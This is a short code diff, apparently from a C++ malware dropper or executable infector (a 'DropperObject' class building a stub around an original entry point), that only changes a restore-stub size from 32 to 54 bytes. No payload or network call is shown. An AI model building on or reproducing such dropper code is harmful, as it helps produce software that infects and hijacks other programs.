@@ -203,9 +203,10 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint )
 	cout << "Original ptr: " << hex << (DWORD)ptr << ", aligned: " << hex << (DWORD)alignToDWORD((DWORD)ptr) << endl;
 	
 	header->restore.offset = ptr - _data.get();
-	header->restore.size = 32;
-	ptr += 32;
-	
+	// static size of restoreStub
+	header->restore.size = 54;  
+	ptr += 54;
+
 	// compute total size
 	_size = alignToDWORD(ptr - _data.get());
 	
